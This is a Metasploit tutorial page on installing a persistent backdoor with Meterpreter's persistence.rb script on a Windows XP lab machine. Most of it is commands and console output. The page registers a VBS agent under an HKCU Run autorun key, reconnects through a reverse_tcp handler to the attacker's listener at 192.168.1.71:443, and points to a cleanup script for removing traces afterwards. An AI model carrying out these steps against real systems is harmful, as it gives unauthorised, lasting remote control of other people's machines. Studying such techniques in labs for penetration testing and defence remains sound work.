---
draft: false
title: MSF Meterpreter Persistent Backdoor
linkTitle:  Persistent Backdoor
translationKey: msf-meterpreter-persistent-backdoor
date: 2017-06-15T13:57:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Using the persistence.rb script code to create a backdoor with Meterpreter.
url: /tr/msf-meterpreter-kalici-backdoor/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
weight: 400
---
## Persistence.rb

Another method that you can use in Metasploit Framework to provide persistence after logging in to the target system is to use the `persistence.rb` script code.

Thanks to this method, you can reconnect even if the target computer is updated. Also, restarting the target system will not affect the connection.

Let's repeat the warning we made for `metsvc` in the previous topic. The `persistence.rb` backdoor does not use any session information for connection. Anyone who discovers this vulnerability can connect.

After logging in to the target system with meterpreter, let's view the help information before using the `persistence.rb` script code and see what possibilities it provides us.

```bash
meterpreter > run persistence -h

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

 -A Automatically start a matching exploit/multi/handler to connect to the agent
 -L Location in target host to write payload to, if none %TEMP% will be used.
 -P Payload to use, default is windows/meterpreter/reverse_tcp.
 -S Automatically start the agent on boot as a service (with SYSTEM privileges)

-T Alternate executable template to use

-U Automatically start the agent when the User logs on

-X Automatically start the agent when the system boots

-h This help menu

-i The interval in seconds between each connection attempt

-p The port on which the system running Metasploit is listening

-r The IP of the system running Metasploit listening for the connect back
```

What does the following `persistence -U -i 5 -p 443 -r 192.168.1.71` command do?

`-U` enables an automatic connection to our computer when a user logs in.

`-i 5` The `persistence.rb` script code on the other side tries to connect to us every 5 seconds.

`-p 443` is the port number on which our listening computer is listening.

`-r 192.168.1.71` is the IP number of our listening computer.

```bash
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
> Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
> Persistent agent script is 613976 bytes long
> Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
> Agent executed with PID 492
> Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
> Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
> For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter >
```

The script that is started as a result of the command we gave also shows how to clean the log when our work is completed, as can be seen in the output.

```bash
multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
```

We can understand whether the script is working and whether it is connecting automatically by restarting the target computer. Let's restart the target computer.

```bash
meterpreter > reboot
Rebooting...
meterpreter > exit

> Meterpreter session 3 closed. Reason: User exit
```

Let's restart the listener module `exploit/multi/handler`.

```bash
msf exploit(ms08_067_netapi) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.71
LHOST => 192.168.1.71
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit

> Started reverse handler on 192.168.1.71:443
> Starting the payload handler...
```

When the target computer restarts, the connection to the local computer will be reestablished as soon as the session is opened, as seen below.

```bash
> Sending stage (748544 bytes) to 192.168.1.161
> Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600

meterpreter > sysinfo
Computer: XEN-XP-SP2-BARE
OS: Windows XP (Build 2600, Service Pack 2).
Arch: x86
Language: en_US
meterpreter >
```
